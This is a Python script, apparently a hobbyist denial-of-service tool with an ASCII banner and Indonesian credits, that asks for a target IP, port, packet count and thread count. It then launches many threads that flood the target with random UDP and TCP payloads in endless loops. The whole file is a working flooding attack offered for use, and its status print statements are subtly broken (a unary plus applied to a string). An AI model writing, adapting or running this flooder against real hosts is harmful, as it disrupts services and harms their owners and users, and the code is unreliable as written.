import random
import socket
import threading
import os,sys

os.system("clear")

print("------------------------------------------------")
print("[+] Tools Used By : Lezhan")
print("[+] Credit Tools : Lordzz,Lezhan")
print("[+]Jangan Abuse Ya Kontol")
print("------------------------------------------------")

print("\033[31mCoded By Lezhan")
print("""\033[31m
 _             _                 
 | |    ___ ___| |__   __ _ _ __  
 | |   / _ \_  / '_ \ / _` | '_ \ 
 | |__|  __// /| | | | (_| | | | |
 |_____\___/___|_| |_|\__,_|_| |_|
                                  """)


ip = str(input(" [ / ]  Target IP:"))
port = int(input(" [ / ]  Target Port:"))
choice = str(input(" [ / ](y/n):"))
times = int(input(" [ / ]  Packets :"))
threads = int(input(" [ / ]  Threads:"))

os.system("clear")
def run():
	data = random._urandom(9024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))

def run2():
	data = random._urandom(1080)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))

def run3():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))

def run4():
	data = random._urandom(811)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))

def run5():
	data = random._urandom(12345)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
			
def run6():
	data = random._urandom(17890)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
			
			
def run7():
	data = random._urandom(1687)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
			
def run8():
	data = random._urandom(9024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
			
def run9():
	data = random._urandom(1234)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
			
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
	else:
		th = threading.Thread(target = run9)
		th.start()
